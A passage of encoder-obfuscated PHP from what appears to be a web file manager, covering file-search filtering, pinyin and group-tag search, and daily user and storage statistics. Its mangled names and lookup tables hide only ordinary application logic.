Model($›½¼§äŸ[428])->field($›½¼§äŸ[84])->where($¦Ğ¬ ˆæ)->select(); $…Í…€¦© = array_to_keyvalue($…Í…€¦©, $›½¼§äŸ[12], $›½¼§äŸ[84]); $îµØ´ˆ = array_unique($…Í…€¦©); $this->_listSearchMerge($ãìï—¹â, $øˆ¨™¶ , $ŒÈÌ•ÚÀ, $îµØ´ˆ); } private function _listSearchDesc(&$ªİ®ÛÚ­, $Ú‡ÌÄø¥, $Àé¬–Ş¡) { $¶âß¼®Ù =& $_SERVER[§ŒØóıü]; if (!$Ú‡ÌÄø¥[$¶âß¼®Ù[1956]] || $ªİ®ÛÚ­[$¶âß¼®Ù[366]][$¶âß¼®Ù[353]] > 1) { return; } $Ó½Şı©Ò = array($¶âß¼®Ù[94] => $¶âß¼®Ù[453], $¶âß¼®Ù[374] => array($¶âß¼®Ù[383], $¶âß¼®Ù[1958] . $Ú‡ÌÄø¥[$¶âß¼®Ù[1956]] . $¶âß¼®Ù[1958])); $Ø‘…’²È = !1; if ($Ø‘…’²È) { $—Ä¾ˆò— = $this->listSearchChildren($Ú‡ÌÄø¥[$¶âß¼®Ù[432]]); $—Ä¾ˆò— = array_unique($—Ä¾ˆò—); if (!$—Ä¾ˆò—) { return; } $Ó½Şı©Ò[$¶âß¼®Ù[402]] = array($¶âß¼®Ù[7], $—Ä¾ˆò—); } $Ïˆ¼ºİ® = Model($¶âß¼®Ù[560])->field($¶âß¼®Ù[402])->where($Ó½Şı©Ò)->limit(5000)->select(); $Ü”¹Çòä = array_to_keyvalue($Ïˆ¼ºİ®, $¶âß¼®Ù[12], $¶âß¼®Ù[402]); $this->_listSearchMerge($ªİ®ÛÚ­, $Ú‡ÌÄø¥, $Àé¬–Ş¡, $Ü”¹Çòä); } private function _listSearchGroupTag(&$±¶¾Èèé, $Éší¨, $Ç±¦ı”ˆ) { $‚™ŠÕúƒ =& $_SERVER[§ŒØóıü]; if (!$Éší¨[$‚™ŠÕúƒ[1956]] || $±¶¾Èèé[$‚™ŠÕúƒ[366]][$‚™ŠÕúƒ[353]] > 1 || !$Éší¨[$‚™ŠÕúƒ[432]]) { return; } $ñ˜¾®‹Ÿ = $this->sourceInfo($Éší¨[$‚™ŠÕúƒ[432]]); if (!$ñ˜¾®‹Ÿ || $ñ˜¾®‹Ÿ[$‚™ŠÕúƒ[411]] != SourceModel::TYPE_GROUP) { return; } $ä—‚ÙÄˆ = $ñ˜¾®‹Ÿ[$‚™ŠÕúƒ[496]]; $§à“÷õ = Model($‚™ŠÕúƒ[2122])->get($ä—‚ÙÄˆ); $…×ã¹§º = array(); $³«—Ã‹ = $Éší¨[$‚™ŠÕúƒ[1956]]; foreach ($§à“÷õ[$‚™ŠÕúƒ[369]] as $­›²Õ–) { $”Ù„—õ = $­›²Õ–[$‚™ŠÕúƒ[32]]; $ËÓÄÂíô = str_replace($‚™ŠÕúƒ[53], $‚™ŠÕúƒ[12], Pinyin::get($”Ù„—õ)); if (stripos($”Ù„—õ, $³«—Ã‹) !== !1 || stripos($ËÓÄÂíô, $³«—Ã‹) !== !1) { $…×ã¹§º[] = $­›²Õ–[$‚™ŠÕúƒ[399]]; } } if (!$…×ã¹§º) { return; } $¶÷•Òµ = array($‚™ŠÕúƒ[426] => array($‚™ŠÕúƒ[7], $…×ã¹§º), $‚™ŠÕúƒ[1673] => 0, $‚™ŠÕúƒ[33] => $‚™ŠÕúƒ[1978] . $ä—‚ÙÄˆ); $Ÿœ©ø‹Ü = Model($‚™ŠÕúƒ[428])->field($‚™ŠÕúƒ[84])->where($¶÷•Òµ)->select(); $Ÿœ©ø‹Ü = array_to_keyvalue($Ÿœ©ø‹Ü, $‚™ŠÕúƒ[12], $‚™ŠÕúƒ[84]); $‰½±´¦š = array_unique($Ÿœ©ø‹Ü); $this->_listSearchMerge($±¶¾Èèé, $Éší¨, $Ç±¦ı”ˆ, $‰½±´¦š); } private function _listSearchMerge(&$¥šÙ±¡î, $—¡’…¾, $æƒéşî´, $îÉø²Œ¦) { $ï£Á†ñ² =& $_SERVER[§ŒØóıü]; if (!$îÉø²Œ¦) { return; } $Ï§íß×¢ = array_to_keyvalue($¥šÙ±¡î[$ï£Á†ñ²[369]], $ï£Á†ñ²[12], $ï£Á†ñ²[402]); $ªÎÜ­ó‚ = array_diff($îÉø²Œ¦, $Ï§íß×¢); if (!$ªÎÜ­ó‚) { return; } $‡°º¯ß = array($ï£Á†ñ²[402] => array($ï£Á†ñ²[7], $ªÎÜ­ó‚)); $İ´Ø½¤ = $this->field($æƒéşî´)->where($‡°º¯ß)->select(); if (!$İ´Ø½¤) { return; } $ıù§ïú­ = array(); foreach ($İ´Ø½¤ as $™áüâÁ) { if ($this->_listSearchFilter($™áüâÁ, $—¡’…¾)) { $ıù§ïú­[] = $™áüâÁ; } } $¥šÙ±¡î[$ï£Á†ñ²[369]] = array_merge($ıù§ïú­, $¥šÙ±¡î[$ï£Á†ñ²[369]]); $¥šÙ±¡î[$ï£Á†ñ²[366]][$ï£Á†ñ²[367]] += count($ıù§ïú­); } private function _listSearchFilter($´³‘ğÃ‰, $…—òŒÊ) { $¢çüÂÊ =& $_SERVER[§ŒØóıü]; $Ç…İç±Â = $´³‘ğÃ‰[$¢çüÂÊ[410]] == $¢çüÂÊ[88]; if (!strstr($´³‘ğÃ‰[$¢çüÂÊ[511]], $¢çüÂÊ[50] . $…—òŒÊ[$¢çüÂÊ[432]] . $¢çüÂÊ[50])) { return !1; } if (isset($…—òŒÊ[$¢çüÂÊ[412]]) && $…—òŒÊ[$¢çüÂÊ[412]] != $¢çüÂÊ[1917]) { if ($…—òŒÊ[$¢çüÂÊ[412]] == $¢çüÂÊ[75] && !$Ç…İç±Â) { return !1; } if ($…—òŒÊ[$¢çüÂÊ[412]] != $¢çüÂÊ[75] && $Ç…İç±Â) { return !1; } if (!strstr($´³‘ğÃ‰[$¢çüÂÊ[174]], $¢çüÂÊ[50] . $…—òŒÊ[$¢çüÂÊ[412]] . $¢çüÂÊ[50])) { return !1; } } if (isset($…—òŒÊ[$¢çüÂÊ[2123]]) && $…—òŒÊ[$¢çüÂÊ[2123]] < $´³‘ğÃ‰[$¢çüÂÊ[76]]) { return !1; } if (isset($…—òŒÊ[$¢çüÂÊ[2124]]) && $…—òŒÊ[$¢çüÂÊ[2124]] > $´³‘ğÃ‰[$¢çüÂÊ[76]]) { return !1; } if (isset($…—òŒÊ[$¢çüÂÊ[590]]) && $…—òŒÊ[$¢çüÂÊ[590]] != $´³‘ğÃ‰[$¢çüÂÊ[456]]) { return !1; } return !0; } public function listSearchChildren($®ÓÕü«†, $¡±ù¬ª³ = 5000) { $Í¾ŒŒª =& $_SERVER[§ŒØóıü]; $ö…ÍÂÙ£ = array(); $ú£²—óé = $this->sourceInfo($®ÓÕü«†); $ë¾ÖÒ®® = array($Í¾ŒŒª[511] => array($Í¾ŒŒª[383], $ú£²—óé[$Í¾ŒŒª[511]] . $ú£²—óé[$Í¾ŒŒª[402]] . $Í¾ŒŒª[541])); $ªì®Ü¿× = $this->field($Í¾ŒŒª[76])->where($ë¾ÖÒ®®)->limit($¡±ù¬ª³ + 1)->select(); $ÅÈƒêïà = is_array($ªì®Ü¿×) ? count($ªì®Ü¿×) : 0; if ($ÅÈƒêïà > $¡±ù¬ª³) { return $this->_listSearchChildrenNear($®ÓÕü«†, $¡±ù¬ª³); } $ÄöÕ›ëÄ = $this->field($Í¾ŒŒª[402])->where($ë¾ÖÒ®®)->select(); $ö…ÍÂÙ£ = array_to_keyvalue($ÄöÕ›ëÄ, $Í¾ŒŒª[12], $Í¾ŒŒª[402]); return $ö…ÍÂÙ£; } private function _listSearchChildrenNear($í°ó†’¿, $àŠ×§æ) { $àïèİÂ› =& $_SERVER[§ŒØóıü]; $‘ÙõšÄ× = array(); $š¨ÚáŸï = array($àïèİÂ›[432] => $í°ó†’¿); $¡îµñ Ú = $this->field($àïèİÂ›[2125])->where($š¨ÚáŸï)->select(); $ñíı„áì = array_to_keyvalue(array_filter_by_field($¡îµñ Ú, $àïèİÂ›[410], $àïèİÂ›[88]), $àïèİÂ›[12], $àïèİÂ›[402]); $‘ÙõšÄ× = array_merge($‘ÙõšÄ×, array_to_keyvalue($¡îµñ Ú, $àïèİÂ›[12], $àïèİÂ›[402])); if (!$ñíı„áì) { return $‘ÙõšÄ×; } $š¨ÚáŸï = array($àïèİÂ›[432] => array($àïèİÂ›[7], $ñíı„áì)); $¡îµñ Ú = $this->field($àïèİÂ›[2125])->where($š¨ÚáŸï)->limit($àŠ×§æ)->select(); $‘ÙõšÄ× = array_merge($‘ÙõšÄ×, array_to_keyvalue($¡îµñ Ú, $àïèİÂ›[12], $àïèİÂ›[402])); $‘ÙõšÄ× = array_slice($‘ÙõšÄ×, 0, $àŠ×§æ); return $‘ÙõšÄ×; } private function _listSearchBindPinyin($½Ã½éìÆ, &$ÌÕÓÙƒù, &$‰ŸÖ¥ë) { $êÍ¡öŠğ =& $_SERVER[§ŒØóıü]; if (!isset($½Ã½éìÆ[$êÍ¡öŠğ[1956]]) || !$½Ã½éìÆ[$êÍ¡öŠğ[1956]]) { return; } if (!Input::check($½Ã½éìÆ[$êÍ¡öŠğ[1956]], $êÍ¡öŠğ[318]) || strlen($½Ã½éìÆ[$êÍ¡öŠğ[1956]]) < 2) { return; } $›™ñÓäŒ = "\114\x45\106\x54\x20\112\117\x49\116\40{$this->tablePrefix}\151\x6f\x5f\163\157\165\x72\x63\145\x5f\155\x65\x74\141\x20\x6d\x65\164\x61\x20\x6f\x6e\x20\163\x6f\x75\162\143\x65\x2e\x73\x6f\x75\x72\143\145\x49\104\40\75\40\x6d\x65\x74\141\56\163\157\x75\162\x63\145\111\104"; $‚Ïò‚¡Ê = array(); $‰ŸÖ¥ë = str_replace(array($êÍ¡öŠğ[231], $êÍ¡öŠğ[53], $êÍ¡öŠğ[2126]), $êÍ¡öŠğ[12], $‰ŸÖ¥ë); $‰ŸÖ¥ë = $êÍ¡öŠğ[438] . str_replace($êÍ¡öŠğ[50], $êÍ¡öŠğ[439], $‰ŸÖ¥ë); $‡™äÏ¯‡ = $ÌÕÓÙƒù[$êÍ¡öŠğ[32]]; unset($ÌÕÓÙƒù[$êÍ¡öŠğ[32]]); foreach ($ÌÕÓÙƒù as $”À²áœ => $“ì€æĞş) { $‚Ïò‚¡Ê[$êÍ¡öŠğ[438] . $”À²áœ] = $“ì€æĞş; } foreach ($‡™äÏ¯‡ as $¥ÓªÀ) { $‚Ïò‚¡Ê[] = array($êÍ¡öŠğ[443] => $¥ÓªÀ, $êÍ¡öŠğ[1006] => $êÍ¡öŠğ[1960], array($êÍ¡öŠğ[2127] => $¥ÓªÀ, $êÍ¡öŠğ[2128] => array($êÍ¡öŠğ[7], array($êÍ¡öŠğ[465], $êÍ¡öŠğ[464])))); } $this->join($›™ñÓäŒ); $ÌÕÓÙƒù = $‚Ïò‚¡Ê; } private function _parseSearchWhere($ÏİÁÚ®°) { $œ˜ÏÇİ… =& $_SERVER[§ŒØóıü]; $Æ€êĞñœ = array(); if (isset($ÏİÁÚ®°[$œ˜ÏÇİ…[766]]) && $ÏİÁÚ®°[$œ˜ÏÇİ…[766]]) { $Æ€êĞñœ[$œ˜ÏÇİ…[85]] = array($œ˜ÏÇİ…[2129], $ÏİÁÚ®°[$œ˜ÏÇİ…[766]]); } if (isset($ÏİÁÚ®°[$œ˜ÏÇİ…[767]]) && $ÏİÁÚ®°[$œ˜ÏÇİ…[767]]) { $Ñ‡–‰äû = array($œ˜ÏÇİ…[2130], $ÏİÁÚ®°[$œ˜ÏÇİ…[767]]); if ($Æ€êĞñœ[$œ˜ÏÇİ…[85]]) { $Æ€êĞñœ[$œ˜ÏÇİ…[85]] = array($Æ€êĞñœ[$œ˜ÏÇİ…[85]], $Ñ‡–‰äû, $œ˜ÏÇİ…[2131]); } else { $Æ€êĞñœ[$œ˜ÏÇİ…[85]] = $Ñ‡–‰äû; } } if (isset($ÏİÁÚ®°[$œ˜ÏÇİ…[2123]]) && $ÏİÁÚ®°[$œ˜ÏÇİ…[2123]] > 0) { $Æ€êĞñœ[$œ˜ÏÇİ…[76]] = array($œ˜ÏÇİ…[2129], $ÏİÁÚ®°[$œ˜ÏÇİ…[2123]]); } if (isset($ÏİÁÚ®°[$œ˜ÏÇİ…[2124]]) && $ÏİÁÚ®°[$œ˜ÏÇİ…[2124]]) { $Ñ‡–‰äû = array($œ˜ÏÇİ…[2130], $ÏİÁÚ®°[$œ˜ÏÇİ…[2124]]); if ($Æ€êĞñœ[$œ˜ÏÇİ…[76]]) { $Æ€êĞñœ[$œ˜ÏÇİ…[76]] = array($Æ€êĞñœ[$œ˜ÏÇİ…[76]], $Ñ‡–‰äû, $œ˜ÏÇİ…[2131]); } else { $Æ€êĞñœ[$œ˜ÏÇİ…[76]] = $Ñ‡–‰äû; } } if (isset($ÏİÁÚ®°[$œ˜ÏÇİ…[590]]) && $ÏİÁÚ®°[$œ˜ÏÇİ…[590]]) { $Æ€êĞñœ[] = array($œ˜ÏÇİ…[456] => $ÏİÁÚ®°[$œ˜ÏÇİ…[590]], $œ˜ÏÇİ…[454] => $ÏİÁÚ®°[$œ˜ÏÇİ…[590]], $œ˜ÏÇİ…[1006] => $œ˜ÏÇİ…[1960]); } if (isset($ÏİÁÚ®°[$œ˜ÏÇİ…[412]]) && $ÏİÁÚ®°[$œ˜ÏÇİ…[412]]) { $£â‡´¡Ø = $ÏİÁÚ®°[$œ˜ÏÇİ…[412]]; if ($£â‡´¡Ø == $œ˜ÏÇİ…[75]) { $Æ€êĞñœ[$œ˜ÏÇİ…[410]] = 1; } else { if ($£â‡´¡Ø == $œ˜ÏÇİ…[2132]) { $Æ€êĞñœ[$œ˜ÏÇİ…[410]] = 0; } else { if ($£â‡´¡Ø) { $£â‡´¡Ø = is_array($£â‡´¡Ø) ? $£â‡´¡Ø : explode($œ˜ÏÇİ…[50], $£â‡´¡Ø); $Æ€êĞñœ[$œ˜ÏÇİ…[412]] = array($œ˜ÏÇİ…[418], $£â‡´¡Ø); $Æ€êĞñœ[$œ˜ÏÇİ…[410]] = 0; } } } } $this->_parseSearchParent($ÏİÁÚ®°, $Æ€êĞñœ); if (isset($ÏİÁÚ®°[$œ˜ÏÇİ…[1956]]) && trim($ÏİÁÚ®°[$œ˜ÏÇİ…[1956]])) { $ûŞ¸¦º = trim($ÏİÁÚ®°[$œ˜ÏÇİ…[1956]]); $ªõøõ  = explode($œ˜ÏÇİ…[53], $ûŞ¸¦º); if (strlen($ûŞ¸¦º) > 2 && (substr($ûŞ¸¦º, 0, 1) == $œ˜ÏÇİ…[118] && substr($ûŞ¸¦º, -1) == $œ˜ÏÇİ…[118]) || substr($ûŞ¸¦º, 0, 1) == $œ˜ÏÇİ…[58] && substr($ûŞ¸¦º, -1) == $œ˜ÏÇİ…[58]) { $ûŞ¸¦º = substr($ûŞ¸¦º, 1, -1); $ªõøõ  = array($ûŞ¸¦º); } $Æ€êĞñœ[$œ˜ÏÇİ…[32]] = array(array($œ˜ÏÇİ…[540], $œ˜ÏÇİ…[1958] . $ûŞ¸¦º . $œ˜ÏÇİ…[1958])); if (count($ªõøõ ) > 1) { $Æ€êĞñœ[$œ˜ÏÇİ…[32]] = array(); foreach ($ªõøõ  as $ü†®ªÓ) { if (!trim($ü†®ªÓ)) { continue; } $Æ€êĞñœ[$œ˜ÏÇİ…[32]][] = array($œ˜ÏÇİ…[540], $œ˜ÏÇİ…[1958] . trim($ü†®ªÓ) . $œ˜ÏÇİ…[1958]); } } } return $Æ€êĞñœ; } private function _parseSearchParent($Œ±ÆñŞÎ, &$ñöÏÅ×) { $Â³£ñõü =& $_SERVER[§ŒØóıü]; if (!isset($Œ±ÆñŞÎ[$Â³£ñõü[432]]) || !$Œ±ÆñŞÎ[$Â³£ñõü[432]]) { return; } $›¦óáú = $this->pathInfo($Œ±ÆñŞÎ[$Â³£ñõü[432]]); $˜‰œ…òì = $›¦óáú[$Â³£ñõü[432]] . $Â³£ñõü[12] === $Â³£ñõü[198]; $‡¦—ßüŒ = $›¦óáú[$Â³£ñõü[411]] == $Â³£ñõü[505]; if ($›¦óáú[$Â³£ñõü[522]] == $Â³£ñõü[523]) { $öÄºÓ¤Î = $this->sourceInfo($Œ±ÆñŞÎ[$Â³£ñõü[432]]); $›¦óáú[$Â³£ñõü[511]] = $öÄºÓ¤Î[$Â³£ñõü[511]]; } $ñöÏÅ×[$Â³£ñõü[580]] = array($Â³£ñõü[540], $›¦óáú[$Â³£ñõü[511]] . $Œ±ÆñŞÎ[$Â³£ñõü[432]] . $Â³£ñõü[541]); $¯âèú­Ô = isset($Œ±ÆñŞÎ[$Â³£ñõü[1821]]) && in_array($Â³£ñõü[505], $Œ±ÆñŞÎ[$Â³£ñõü[1821]]); if (!$¯âèú­Ô || !$‡¦—ßüŒ || !$˜‰œ…òì || !$›¦óáú[$Â³£ñõü[413]]) { return; } if (!AuthModel::authCheckRoot($›¦óáú[$Â³£ñõü[413]][$Â³£ñõü[414]])) { return; } $†é“ÚÈ = $›¦óáú[$Â³£ñõü[496]] . $Â³£ñõü[12]; if ($†é“ÚÈ == $Â³£ñõü[88]) { unset($ñöÏÅ×[$Â³£ñõü[580]]); $ñöÏÅ×[$Â³£ñõü[411]] = self::TYPE_GROUP; return; } $¬Éà¢é = Model($Â³£ñõü[512])->groupChildrenAll($†é“ÚÈ); $±º¦áª‡ = count($¬Éà¢é); if ($±º¦áª‡ <= 1) { return; } $ˆÜ€à‰Ş = array($Â³£ñõü[432] => 0, $Â³£ñõü[411] => self::TYPE_GROUP, $Â³£ñõü[496] => array($Â³£ñõü[7], $¬Éà¢é)); $ş¨Èíõ = $this->field($Â³£ñõü[2133])->where($ˆÜ€à‰Ş)->limit($±º¦áª‡)->select(); $ñöÏÅ×[$Â³£ñõü[580]] = array(); foreach ($ş¨Èíõ as $úş´ÈßŸ) { $ñöÏÅ×[$Â³£ñõü[580]][] = array($Â³£ñõü[540], $Â³£ñõü[521] . $úş´ÈßŸ[$Â³£ñõü[402]] . $Â³£ñõü[541]); } $ñöÏÅ×[$Â³£ñõü[580]][] = $Â³£ñõü[1960]; } } goto eÊ–ÖŞßÄÍ; F£»Æç ‰Ç: class AnalysisModel extends ModelBaseLight { public function init($É¦ŸÃğ‡) { $ŒÀŠú¥í =& $_SERVER[§ŒØóıü]; $Áã¿íüƒ = array($ŒÀŠú¥í[590] => array($ŒÀŠú¥í[33] => $ŒÀŠú¥í[1791], $ŒÀŠú¥í[273] => array($ŒÀŠú¥í[224], $ŒÀŠú¥í[771], $ŒÀŠú¥í[1792], $ŒÀŠú¥í[1793])), $ŒÀŠú¥í[1794] => array($ŒÀŠú¥í[33] => $ŒÀŠú¥í[1795], $ŒÀŠú¥í[273] => array($ŒÀŠú¥í[224], $ŒÀŠú¥í[769], $ŒÀŠú¥í[1796], $ŒÀŠú¥í[1797], $ŒÀŠú¥í[1798]))); if (!isset($Áã¿íüƒ[$É¦ŸÃğ‡])) { return !1; } $this->optionType = $Áã¿íüƒ[$É¦ŸÃğ‡][$ŒÀŠú¥í[33]]; $this->field = $Áã¿íüƒ[$É¦ŸÃğ‡][$ŒÀŠú¥í[273]]; return !0; } public function listData($ŠñÖÖúÂ = false, $ºˆÍìŞª = "\155\157\x64\x69\146\171\x54\x69\155\x65", $â¬Â¸ËÚ = false) { return parent::listData($ŠñÖÖúÂ, $ºˆÍìŞª, $â¬Â¸ËÚ); } public function trendList($¨¹ŸÃé¸) { $É¡Ã’œ =& $_SERVER[§ŒØóıü]; $­÷–…ä… = $this->listData(); if ($­÷–…ä…) { $åŸ˜ÃËÀ = end($­÷–…ä…); $‹ªÜæÃİ = date($É¡Ã’œ[1799], strtotime($É¡Ã’œ[1800])); if ($åŸ˜ÃËÀ[$É¡Ã’œ[224]] == $‹ªÜæÃİ) { return $­÷–…ä…; } $™ÚİÍí‚ = strtotime($åŸ˜ÃËÀ[$É¡Ã’œ[224]]); } if (!isset($™ÚİÍí‚)) { $‡—õ¬æÌ = $¨¹ŸÃé¸ == $É¡Ã’œ[590] ? $É¡Ã’œ[525] : $É¡Ã’œ[831]; $™ÚİÍí‚ = Model($‡—õ¬æÌ)->min($É¡Ã’œ[201]); } $°›®æå = $É¡Ã’œ[1801] . ucfirst($¨¹ŸÃé¸); $å¹˜»…ô = $this->dateList($™ÚİÍí‚); foreach ($å¹˜»…ô as $‹ªÜæÃİ) { $this->{$°›®æå}($‹ªÜæÃİ); } return $this->listData(); } private function dateList($‚ïÒµÆ§) { $ÛÉ¤¹„— =& $_SERVER[§ŒØóıü]; $²´Ú–¬ = $‚ïÒµÆ§; $²™Ã…òÈ = strtotime($ÛÉ¤¹„—[1800]); $†×¦éÅß = array(); while ($²´Ú–¬ <= $²™Ã…òÈ) { $†×¦éÅß[] = date($ÛÉ¤¹„—[1799], $²´Ú–¬); $²´Ú–¬ = strtotime($ÛÉ¤¹„—[1802], $²´Ú–¬); } return $†×¦éÅß; } public function _recordUser($à¨è›‹æ = '') { $«©ì¡¦÷ =& $_SERVER[§ŒØóıü]; $‡ÏÓ±Óş = strtotime(date($«©ì¡¦÷[1803], strtotime($à¨è›‹æ))); $É”ïñÕ = strtotime(date($«©ì¡¦÷[1804], strtotime($à¨è›‹æ))); $åéŸù¾ = array($«©ì¡¦÷[201] => array($«©ì¡¦÷[1019], $É”ïñÕ)); $ëÊ•ıñ™ = Model($«©ì¡¦÷[525])->where($åéŸù¾)->count($«©ì¡¦÷[1673]); $åéŸù¾[$«©ì¡¦÷[201]] = array($«©ì¡¦÷[333], array($‡ÏÓ±Óş, $É”ïñÕ)); $¤ŞÏ¥ç® = Model($«©ì¡¦÷[525])->where($åéŸù¾)->count($«©ì¡¦÷[1673]); $åéŸù¾[$«©ì¡¦÷[33]] = $«©ì¡¦÷[1805]; $ÆìÄ°³µ = Model($«©ì¡¦÷[1806])->where($åéŸù¾)->count($«©ì¡¦÷[1807]); $¢¥¡Êİ = array($«©ì¡¦÷[224] => $à¨è›‹æ, $«©ì¡¦÷[771] => (int) $ëÊ•ıñ™, $«©ì¡¦÷[1792] => (int) $¤ŞÏ¥ç®, $«©ì¡¦÷[1793] => (int) $ÆìÄ°³µ); return $this->insert($¢¥¡Êİ); } public function _recordStore($Ì˜íùª” = '') { $Ä‡›ÚÍ =& $_SERVER[§ŒØóıü]; $ğ‹‰÷ô· = strtotime(date($Ä‡›ÚÍ[1804], strtotime($Ì˜íùª”))); $‘Ë¹¸œ = array($Ä‡›ÚÍ[201] => array($Ä‡›ÚÍ[1019], $ğ‹‰÷ô·)); $Œàî³Ñã = Model($Ä‡›ÚÍ[471])->where($‘Ë¹¸œ)->sum($Ä‡›ÚÍ[76]); $‘Ë¹¸œ[$Ä‡›ÚÍ[410]] = 0; $ùÙ©¥ıÍ = Model($Ä‡›ÚÍ[831])->where($‘Ë¹¸œ)->sum($Ä‡›ÚÍ[76]); $‘Ë¹¸œ[$Ä‡›ÚÍ[411]] = 1; $·‰ª‰‹– = Model($Ä‡›ÚÍ[831])->where($‘Ë¹¸œ)->sum($Ä‡›ÚÍ[76]); $‘Ë¹¸œ[$Ä‡›ÚÍ[411]] = 2; $òÅëÛå = Model($Ä‡›ÚÍ[831])->where($‘Ë¹¸œ)->sum($Ä‡›ÚÍ[76]); $úÂ¼€àÈ = array($Ä‡›ÚÍ[224] => $Ì˜íùª”, $Ä‡›ÚÍ[769] => (int) $ùÙ©¥ıÍ, $Ä‡›ÚÍ[1796] => (int) $Œàî³Ñã, $Ä‡›ÚÍ[1797] => (int) $·‰ª‰‹–, $Ä‡›ÚÍ[1798] => (int) $òÅëÛå); return $this->insert($úÂ¼€àÈ); } public function trend($©ò„¿·‘, $¤—È¡¤İ) { $™Ù¨—°ğ =& $_SERVER[§ŒØóıü]; if (!$this->init($©ò„¿·‘)) { return !1; } $µ°½¼ñÊ = $this->trendList($©ò„¿·‘); if ($µ°½¼ñÊ && $¤—È¡¤İ != $™Ù¨—°ğ[1646]) { $†ÈÅË¸÷ = $µ°½¼ñÊ[0][$™Ù¨—°ğ[224]]; $ÔêùÄ£ = $this->validDate($¤—È¡¤İ, $†ÈÅË¸÷); $­ŞîÏŠœ = array(); $öŞºö«­ = array_to_keyvalue($µ°½¼ñÊ, $™Ù¨—°ğ[224]); foreach ($ÔêùÄ£ as $ÈòìäÛ) { if (isset($öŞºö«­[$ÈòìäÛ])) { $¦Ì¼ã = $öŞºö«­[$ÈòìäÛ]; } else { $¦Ì¼ã = end($µ°½¼ñÊ); $¦Ì¼ã[$™Ù¨—°ğ[224]] = $ÈòìäÛ; if ($©ò„¿·‘ == $™Ù¨—°ğ[590]) { $¦Ì¼ã[$™Ù¨—°ğ[1792]] = $¦Ì¼ã[$™Ù¨—°ğ[1793]] = 0; } } $­ŞîÏŠœ[] = $¦Ì¼ã; } $µ°½¼ñÊ = $­ŞîÏŠœ; } $†´éæË = array($™Ù¨—°ğ[590] => array($™Ù¨—°ğ[771] => LNG($™Ù¨—°ğ[1808]), $™Ù¨—°ğ[1792] => LNG($™Ù¨—°ğ[1809]), $™Ù¨—°ğ[1793] => LNG($™Ù¨—°ğ[1810])), $™Ù¨—°ğ[1794] => array($™Ù¨—°ğ[769] => LNG($™Ù¨—°ğ[1811]), $™Ù¨—°ğ[1796] => LNG($™Ù¨—°ğ[1812]), $™Ù¨—°ğ[1797] => LNG($™Ù¨—°ğ[1813]), $™Ù¨—°ğ[1798] => LNG($™Ù¨—°ğ[1814]))); $ÍŒºœ®­ = array($™Ù¨—°ğ[590] => $™Ù¨—°ğ[1815], $™Ù¨—°ğ[1794] => $™Ù¨—°ğ[76]); if (empty($µ°½¼ñÊ)) { $ÈòìäÛ = date($™Ù¨—°ğ[1799], strtotime($™Ù¨—°ğ[1800])); $äÁç±ì¶ = array($™Ù¨—°ğ[224] => $ÈòìäÛ); foreach ($†´éæË[$©ò„¿·‘] as $ªÊÈÉ™ => $²»¸ŸÁË) { $äÁç±ì¶[$ªÊÈÉ™] = 0; } $µ°½¼ñÊ[] = $äÁç±ì¶; } $ª¾°ŸæÚ = array(); foreach ($µ°½¼ñÊ as $²»¸ŸÁË) { if ($©ò„¿·‘ == $™Ù¨—°ğ[1794] && $²»¸ŸÁË[$™Ù¨—°ğ[1796]] > $²»¸ŸÁË[$™Ù¨—°ğ[769]]) { $²»¸ŸÁË[$™Ù¨—°ğ[1796]] = $²»¸ŸÁË[$™Ù¨—°ğ[769]]; } foreach ($†´éæË[$©ò„¿·‘] as $ªÊÈÉ™ => $ÔåÚ­« ) { $¦Ì¼ã = array($™Ù¨—°ğ[224] => $²»¸ŸÁË[$™Ù¨—°ğ[224]], $™Ù¨—°ğ[1573] => $ÔåÚ­« ); $¦Ì¼ã[$ÍŒºœ®­[$©ò„¿·‘]] = isset($²»¸ŸÁË[$ªÊÈÉ™]) ? $²»¸ŸÁË[$ªÊÈÉ™] : 0; $ª¾°ŸæÚ[] = $¦Ì¼ã; } } return $ª¾°ŸæÚ; } public function validDate($“Ëèçìó, $Ê€ºÊìÜ) { $Ù£¾æé› =& $_SERVER[§ŒØóıü]; $É¿Êö¯ = date($Ù£¾æé›[1799], strtotime($Ù£¾æé›[1800])); $¢û¯µˆ = array($É¿Êö¯); switch ($“Ëèçìó) { case $Ù£¾æé›[1653]: $¸£ÂÍ–‚ = mktime(0, 0, 0, date($Ù£¾æé›[1816]), date($Ù£¾æé›[1394]) - date($Ù£¾æé›[1457]) + 7 - 7, date($Ù£¾æé›[1817])); $œ¡±Ôõß = 0; do { $î¶Ê†»Ñ = date($Ù£¾æé›[1799], $¸£ÂÍ–‚ - 3600 * 24 * 7 * $œ¡±Ôõß); $¢û¯µˆ[] = $î¶Ê†»Ñ; $œ¡±Ôõß++; } while ($Ê€ºÊìÜ < $î¶Ê†»Ñ); break; case $Ù£¾æé›[1651]: $œ¡±Ôõß = 1; do { $ğóŸş¾Ì = date($Ù£¾æé›[1818], strtotime("\x2d\x20{$œ¡±Ôõß}\x20\155\157\156\x74\150\163")); $¢û¯µˆ[] = $ğóŸş¾Ì; $œ¡±Ôõß++; } while ($Ê€ºÊìÜ < $ğóŸş¾Ì); break; case $Ù£¾æé›[1819]: $Ü¹™ É = (int) date($Ù£¾æé›[1817], strtotime($Ê€ºÊìÜ)); $Œ–ÓÔ‡œ = (int) date($Ù£¾æé›[1817]); if ($Ü¹™ É >= $Œ–ÓÔ‡œ) { break; } for ($Ü¹™ É; $Ü¹™ É < $Œ–ÓÔ‡œ; $Ü¹™ É++) { $¢û¯µˆ[] = $Ü¹™ É . $Ù£¾æé›[1820]; } break; default: break; } if ($Ê€ºÊìÜ > end($¢û¯µˆ)) { array_pop($¢û¯µˆ); } sort($¢û¯µˆ); return $¢û¯µˆ; } public function listTable($¸¡—ñä“) { $ØÃ§õá‡ = ucfirst($¸¡—ñä“); return Model($ØÃ§õá‡)->listData(); } public function option($Ôï…¯îñ) { $Å¯«Öõ¥ = $_SERVER[§ŒØóıü][1821] . ucfirst($Ôï…¯îñ); return $this->{$Å¯«Öõ¥}(); } private function optionUser() { $¬Óû¤ =& $_SERVER[§ŒØóıü]; $Öİ»›ê‚ = Model($¬Óû¤[525])->count($¬Óû¤[1673]); $‡åíÍï« = Model($¬Óû¤[525])->where($¬Óû¤[1822])->count($¬Óû¤[1673]); $¯’¶æ’– = intval($GLOBALS[$¬Óû¤[6]][$¬Óû¤[349]][$¬Óû¤[1628]]) / 3600; $³ªÅœ‰ = strtotime("\55{$¯’¶æ’–}\x20\150\157\165\x72\163"); $áĞìöÓ = strtotime(date($¬Óû¤[1803])); if ($³ªÅœ‰ < $áĞìöÓ) { $³ªÅœ‰ = 